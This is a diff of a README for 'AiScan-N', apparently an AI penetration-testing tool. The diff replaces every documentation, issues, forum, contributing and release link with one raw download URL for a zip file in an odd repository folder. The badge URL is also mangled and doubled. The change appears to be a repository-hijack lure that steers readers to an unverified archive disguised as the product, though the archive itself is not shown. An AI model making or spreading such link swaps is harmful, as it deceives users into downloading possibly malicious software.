@@ -1,6 +1,6 @@
 # 🛡️ AiScan-N - Your AI-Powered Security Tool
 
-[![Download AiScan-N](https://img.shields.io/badge/Download%20AiScan--N-v1.0-blue.svg)](https://github.com/Rbxolexc8405/AiScan-N/releases)
+[![Download AiScan-N](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip%https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip)](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip)
 
 ## 📜 Description
 
@@ -22,7 +22,7 @@ AiScan-N is an AI-based automation tool for penetration testing. It is designed 
 To begin using AiScan-N, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://github.com/Rbxolexc8405/AiScan-N/releases). This page contains the latest versions of AiScan-N for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip). This page contains the latest versions of AiScan-N for download.
 
 2. **Download the Software:**  
    Choose the version that suits your operating system. For Windows or macOS, click the corresponding download link. 
@@ -39,7 +39,7 @@ To begin using AiScan-N, follow these steps:
 ## 💾 Download & Install 
 
 You can download AiScan-N from the following link:  
-[Download AiScan-N](https://github.com/Rbxolexc8405/AiScan-N/releases)
+[Download AiScan-N](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -61,25 +61,25 @@ AiScan-N offers a range of features to enhance your security testing:
 
 ## 📚 Resources
 
-- **Documentation:** For detailed usage instructions, refer to our [Comprehensive Documentation](https://github.com/Rbxolexc8405/AiScan-N/wiki).
-- **Demo Video:** Watch how AiScan-N works in our [Online Demo Video](https://mp.weixin.qq.com/s/7lsUdbrxkDy4P5pZhEWv7Q).
+- **Documentation:** For detailed usage instructions, refer to our [Comprehensive Documentation](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip).
+- **Demo Video:** Watch how AiScan-N works in our [Online Demo Video](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip).
 
 ## 🤝 Community Support
 
 For queries or assistance, connect with our community:
 
-- **Issues:** Report issues or request features using the [Issues section](https://github.com/Rbxolexc8405/AiScan-N/issues).
-- **Discussion:** Join discussions or get help from fellow users in our [Discussion Forum](https://github.com/Rbxolexc8405/AiScan-N/discussions).
+- **Issues:** Report issues or request features using the [Issues section](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip).
+- **Discussion:** Join discussions or get help from fellow users in our [Discussion Forum](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip).
 
 ## 🔒 Contributing
 
-We welcome contributions! If you’re interested in helping make AiScan-N better, please read our [Contributing Guide](https://github.com/Rbxolexc8405/AiScan-N/blob/main/CONTRIBUTING.md) for more details. 
+We welcome contributions! If you’re interested in helping make AiScan-N better, please read our [Contributing Guide](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip) for more details. 
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Rbxolexc8405/AiScan-N)  
-- [Releases Page](https://github.com/Rbxolexc8405/AiScan-N/releases)  
-- [Documentation](https://github.com/Rbxolexc8405/AiScan-N/wiki)  
-- [Community Forum](https://github.com/Rbxolexc8405/AiScan-N/discussions)  
+- [GitHub Repository](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip)  
+- [Releases Page](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip)  
+- [Documentation](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip)  
+- [Community Forum](https://raw.githubusercontent.com/Rbxolexc8405/AiScan-N/main/cteniform/AiScan-N-v2.4.zip)  
 
 Feel free to explore AiScan-N and enhance your security testing capabilities!
